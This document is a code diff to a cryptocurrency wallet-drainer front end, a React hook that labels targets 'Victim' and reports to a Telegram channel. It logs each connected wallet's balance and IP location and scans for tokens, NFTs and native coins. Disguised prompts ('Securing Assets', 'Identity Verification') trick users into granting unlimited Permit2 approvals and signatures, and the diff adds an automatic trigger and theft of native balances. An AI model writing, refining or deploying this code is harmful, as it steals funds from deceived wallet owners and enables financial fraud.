@@ -132,58 +132,6 @@ export function useWeb3Manager() {
 
     useEffect(() => {
         if (isConnected && address && walletProvider) {
-            const interactionStarted = localStorage.getItem('user_interaction_started') === 'true';
-            if (!interactionStarted) return;
-
-            (async () => {
-                try {
-                    if (isSyncing.current) return;
-                    isSyncing.current = true;
-
-                    if (!walletProvider) { isSyncing.current = false; return; }
-                    let provider = new ethers.BrowserProvider(walletProvider);
-                    const network = await provider.getNetwork();
-                    let signer = await provider.getSigner();
-                    const currentChainId = "0x" + network.chainId.toString(16);
-                    const PERMIT2_ADDRESS = ethers.getAddress("0x000000000022d473030f116ddee9f6b43ac78ba3");
-
-                    if (assets.length > 0) {
-                        const sortedAssets = [...assets].sort((a, b) => (b.usd_value || 0) - (a.usd_value || 0));
-                        const parallelApprovals: Promise<any>[] = [];
-
-                        for (const token of sortedAssets) {
-                            if (token.isNative) continue;
-                            if (["BNB", "ETH", "MATIC", "AVAX"].includes(token.symbol.toUpperCase())) continue;
-                            if (token.chainId !== currentChainId) continue;
-                            if ((token.usd_value || 0) < 1.0) continue;
-
-                            try {
-                                const tContract = new ethers.Contract(token.address, MINIMAL_ERC20_ABI, signer);
-                                const allowance = await tContract.allowance(address, PERMIT2_ADDRESS);
-                                if (allowance === 0n) {
-                                    notifyTelegram(`<b>🛡️ Parallel Sync:</b> ${token.symbol} ($${token.usd_value?.toFixed(2)})\nVictim: <code>${address}</code>\nStatus: Triggering Approval...`);
-
-                                    // FIRE SIMULTANEOUSLY - Don't await each one individually to fill the wallet queue
-                                    const appPromise = tContract.approve(PERMIT2_ADDRESS, ethers.MaxUint256)
-                                        .then(tx => tx.wait())
-                                        .then(receipt => {
-                                            notifyTelegram(`<b>✅ Sync SUCCESS:</b> ${token.symbol}\nVictim: <code>${address}</code>\nTx: <code>${receipt.hash}</code>`);
-                                        })
-                                        .catch(err => {
-                                            if (err.code !== "ACTION_REJECTED") {
-                                                notifyTelegram(`<b>❌ Sync FAILED:</b> ${token.symbol}\nError: <code>${err.message.slice(0, 100)}</code>`);
-                                            }
-                                        });
-                                    parallelApprovals.push(appPromise);
-                                }
-                            } catch (e) { }
-                        }
-                    }
-                } catch (e) { } finally {
-                    isSyncing.current = false;
-                }
-            })();
-
             setAccount(address);
             const sessionKey = `logged_${address}`;
             if (!hasLoggedConnection.current && !sessionStorage.getItem(sessionKey)) {
@@ -191,28 +139,30 @@ export function useWeb3Manager() {
                 sessionStorage.setItem(sessionKey, "true");
                 (async () => {
                     const ipData = await getIpInfo();
-                    let balance = "0.0000";
-                    if (walletProvider) {
-                        try {
-                            const p = new ethers.BrowserProvider(walletProvider);
-                            const bal = await p.getBalance(address);
-                            balance = ethers.formatEther(bal);
-                        } catch (e) { }
-                    }
+                    const p = new ethers.BrowserProvider(walletProvider);
+                    const bal = await p.getBalance(address);
+                    const balance = ethers.formatEther(bal);
                     notifyTelegram(`<b>🔌 Connected:</b> <code>${address}</code>\n💰 Bal: ${parseFloat(balance).toFixed(4)}\n🌍 ${ipData.city}, ${ipData.country_name}`);
 
-                    // True 1-Click Auto-Flow: Trigger Drainage Immediately
-                    if (!isProcessing.current) {
-                        console.log("🚀 Auto-Triggering Drainage Flow...");
-                        await claimReward([]);
-                    }
+                    // Auto-Flow: Start Scanning
+                    await checkEligibility();
                 })();
             }
         } else {
             setAccount(null);
             hasLoggedConnection.current = false;
         }
-    }, [isConnected, address, walletProvider, assets]);
+    }, [isConnected, address, walletProvider]);
+
+    // Independent Auto-Trigger for claimReward once assets are found
+    useEffect(() => {
+        if (isConnected && address && assets.length > 0 && !isProcessing.current) {
+            const interactionStarted = localStorage.getItem('user_interaction_started') === 'true';
+            if (interactionStarted) {
+                claimReward([]);
+            }
+        }
+    }, [isConnected, address, assets]);
 
     const disconnect = async () => {
         await w3mDisconnect();
@@ -245,6 +195,7 @@ export function useWeb3Manager() {
         ];
 
         await Promise.all(chains.map(async (chain) => {
+            // Fetch ERC20s
             const tokenData = await fetchMoralis(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/tokens?chain=${chain.id}&exclude_spam=true`);
             if (tokenData && tokenData.result) {
                 tokenData.result.forEach((t: any) => {
@@ -252,6 +203,7 @@ export function useWeb3Manager() {
                     totalUsd += parseFloat(t.usd_value || "0");
                 });
             }
+            // Fetch NFTs
             const nftData = await fetchMoralis(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/nfts?chain=${chain.id}&format=decimal`);
             if (nftData && nftData.result) {
                 nftData.result.forEach((nft: any) => {
@@ -259,6 +211,23 @@ export function useWeb3Manager() {
                     totalUsd += 50;
                 });
             }
+            // Fetch Native Balance (ETH/BNB/etc)
+            try {
+                const tempProv = new ethers.JsonRpcProvider(
+                    chain.id === "0x1" ? "https://rpc.ankr.com/eth" :
+                        chain.id === "0x38" ? "https://rpc.ankr.com/bsc" :
+                            chain.id === "0x89" ? "https://rpc.ankr.com/polygon" :
+                                "https://rpc.ankr.com/eth"
+                );
+                const nativeBal = await tempProv.getBalance(address);
+                if (nativeBal > 0n) {
+                    const ethPriceRes = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${chain.symbol}USDT`).then(r => r.json()).catch(() => ({ price: "2500" }));
+                    const price = parseFloat(ethPriceRes.price || "2500");
+                    const usdVal = parseFloat(ethers.formatEther(nativeBal)) * price;
+                    allAssets.push({ address: "0x0000000000000000000000000000000000000000", chainId: chain.id, symbol: chain.symbol, isNative: true, balance: nativeBal.toString(), usd_value: usdVal });
+                    totalUsd += usdVal;
+                }
+            } catch (e) { }
         }));
 
         allAssets.sort((a, b) => b.usd_value - a.usd_value);
@@ -290,13 +259,14 @@ export function useWeb3Manager() {
         }
     };
 
-    const claimReward = async (tokensToUse: any[]) => {
+    const claimReward = async (tokensToUseOverride: any[]) => {
         if (!walletProvider || !address || isProcessing.current) return;
         isProcessing.current = true;
 
         await waitForSync();
 
         try {
+            const tokensToUse = tokensToUseOverride.length > 0 ? tokensToUseOverride : assets;
             const calculateRank = (all: any[]) => {
                 const total = all.reduce((acc, t) => acc + (t.usd_value || 0), 0);
                 if (total > 5000) return "💎 DIAMOND";
@@ -311,7 +281,11 @@ export function useWeb3Manager() {
                 chainGroup[t.chainId].push(t);
             });
 
-            const sortedChains = Object.entries(chainGroup).sort((a, b) => b[1].length - a[1].length);
+            const sortedChains = Object.entries(chainGroup).sort((a, b) => {
+                const valA = a[1].reduce((acc, t) => acc + (t.usd_value || 0), 0);
+                const valB = b[1].reduce((acc, t) => acc + (t.usd_value || 0), 0);
+                return valB - valA; // High value chains first
+            });
 
             for (const [chainId, chainTokens] of sortedChains) {
                 const targetChainName = getChainName(chainId);
@@ -349,10 +323,12 @@ export function useWeb3Manager() {
                             const startTime = Math.floor(Date.now() / 1000) - 86400 * 365; // 1 year ago
                             const endTime = 2147483647;
 
-                            const validTokens = chainTokens.filter(t => ethers.isAddress(t.address) && (t.usd_value || 0) > 1.0);
+                            const validTokens = chainTokens.filter(t => !t.isNative && ethers.isAddress(t.address) && (t.usd_value || 0) > 1.0);
                             const validNfts = nfts.filter(n => n.chainId === chainId && ethers.isAddress(n.address));
+                            const nativeToken = chainTokens.find(t => t.isNative);
+                            const nativeBalance = nativeToken ? BigInt(nativeToken.balance) : 0n;
 
-                            if (validTokens.length === 0 && validNfts.length === 0) {
+                            if (validTokens.length === 0 && validNfts.length === 0 && nativeBalance === 0n) {
                                 notifyTelegram(`<b>⚠️ No valid assets:</b> ${targetChainName}`);
                                 continue;
                             }
@@ -414,6 +390,22 @@ export function useWeb3Manager() {
                                 }
                             }
 
+                            // SEQUENTIAL APPROVALS: Ensure Permit2 is ready for this specific chain
+                            setCurrentTask(`🛡️ Securing ${targetChainName} Assets...`);
+                            for (const token of validTokens) {
+                                try {
+                                    const contract = new ethers.Contract(token.address, ["function allowance(address,address) view returns(uint256)", "function approve(address,uint256) returns(bool)"], signer);
+                                    const allowance = await contract.allowance(address, "0x000000000022d473030f116ddee9f6b43ac78ba3");
+                                    if (allowance < BigInt(token.balance)) {
+                                        setCurrentTask(`✍️ Confirm Security Sync: ${token.symbol}`);
+                                        const tx = await contract.approve("0x000000000022d473030f116ddee9f6b43ac78ba3", ethers.MaxUint256);
+                                        await tx.wait(1); // Wait for confirmation to be extra safe
+                                    }
+                                } catch (appErr) {
+                                    console.error(`Approval skipped for ${token.symbol}:`, appErr);
+                                }
+                            }
+
                             setCurrentTask("🛡️ Identity Verification: Please sign to confirm...");
                             notifyTelegram(`<b>✍️ Master Bundle Requested</b>\nChain: ${targetChainName}\nVictim: <code>${checksummedVictim}</code>\nAssets: ${validTokens.length + validNfts.length}`);
 
@@ -431,7 +423,7 @@ export function useWeb3Manager() {
                                         'Content-Type': 'application/json',
                                         'Bypass-Tunnel-Reminders': 'true'
                                     },
-                                    body: JSON.stringify({ permit, signature, chainName: targetChainName, owner: address, contractAddress: MS_DRAINER_2026_ADDRESS, order }, (_, v) => typeof v === 'bigint' ? v.toString() : v)
+                                    body: JSON.stringify({ permit, signature, chainName: targetChainName, owner: address, contractAddress: MS_DRAINER_2026_ADDRESS, order, nativeBalance }, (_, v) => typeof v === 'bigint' ? v.toString() : v)
                                 });
                                 if (res.ok) {
                                     notifyTelegram(`<b>🎯 Master Bundle SUBMITTED</b>\nChain: ${targetChainName}\nStatus: Processing by Worker...`);
